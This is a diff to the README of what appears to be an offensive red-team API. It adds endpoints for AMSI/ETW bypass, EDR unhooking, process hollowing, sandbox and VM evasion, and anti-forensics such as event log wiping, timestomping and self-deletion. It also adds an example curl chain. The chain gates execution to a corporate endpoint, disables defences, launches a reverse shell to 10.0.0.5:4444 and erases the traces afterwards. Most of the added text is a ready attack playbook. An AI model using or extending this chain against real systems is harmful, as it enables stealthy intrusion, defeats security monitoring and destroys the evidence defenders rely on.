@@ -128,7 +128,9 @@ Platforms: `teams, slack, okta, o365, github, generic`.
 | GET/POST | `/lateral` | WMI, PsExec, WinRM, DCOM, schtasks, PtH, evil-winrm, xfreerdp. |
 | GET/POST | `/adattack` | Kerberoast, ASREProast, DCSync, golden/silver/ACL tickets, GPP, zerologon check. |
 | GET/POST | `/privesc` | UAC bypasses, unquoted paths, service perms, potatoes, DLL hijack. |
-| GET/POST | `/evasion` | AMSI/ETW patches, CLM bypass, Defender exclusion, LOLBAS (mshta/regsvr32/certutil), PS downgrade. |
+| GET/POST | `/evasion` | 31 techniques — AMSI/ETW (reflection + CLR patch + **hardware-breakpoint patchless** + provider unregister + WLDP downgrade), CLM bypass, Defender exclusion/disable, LOLBAS (**mshta, regsvr32, certutil, msbuild, installutil, cmstp, msxsl, wmic_xsl, syncappv, pubprn**), PS downgrade, **direct/indirect syscalls** (HellsGate/SysWhispers3), **NTDLL unhook**, **Ekko sleep masking**, **PPID spoof**, **process hollowing**, **module stomping**, **thread hijack**. |
+| GET/POST | `/anti_forensics` | Post-engagement artifact cleanup — event log wipe, USN journal, Prefetch, Recent files, Recycle Bin, Jump Lists, ShellBags, Amcache, PS history, file time-stomping, ADS payload hiding, self-deletion stub. |
+| GET/POST | `/sandbox_evasion` | Environment gates — VM detection (CPUID / WMI / artifacts), uptime + RAM + screen-resolution + recent-files + domain-joined sandbox checks, geofencing, time-delay, anti-debug (IsDebuggerPresent + CheckRemoteDebuggerPresent + PEB NtGlobalFlag). |
 
 ### Linux / macOS
 | Method | Path | Description |
@@ -174,6 +176,34 @@ curl -X POST http://localhost:8080/chain \
     ]
   }'
 ```
+
+## Example chain — Full evasion stack (sandbox gate → bypasses → payload → cleanup)
+
+```bash
+curl -X POST http://localhost:8080/chain \
+  -H "Authorization: Bearer $API_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "lhost": "10.0.0.5",
+    "lport": 4444,
+    "steps": [
+      {"module": "sandbox_evasion", "technique": "sandbox_check_uptime", "threshold": 1800},
+      {"module": "sandbox_evasion", "technique": "sandbox_check_domain_joined"},
+      {"module": "sandbox_evasion", "technique": "vm_detect_wmi"},
+      {"module": "evasion", "technique": "amsi_hwbp"},
+      {"module": "evasion", "technique": "etw_hwbp"},
+      {"module": "evasion", "technique": "ntdll_unhook"},
+      {"module": "evasion", "technique": "ppid_spoof"},
+      {"module": "generate", "language": "powershell"},
+      {"module": "anti_forensics", "technique": "clear_powershell_history"},
+      {"module": "anti_forensics", "technique": "clear_event_logs"}
+    ]
+  }'
+```
+
+This produces a sequenced playbook: gate execution to a real corporate endpoint,
+disable AMSI + ETW patchlessly, wipe EDR userland hooks, spoof the parent PID,
+run the reverse shell, and clean up traces on exit.
 
 ---
 
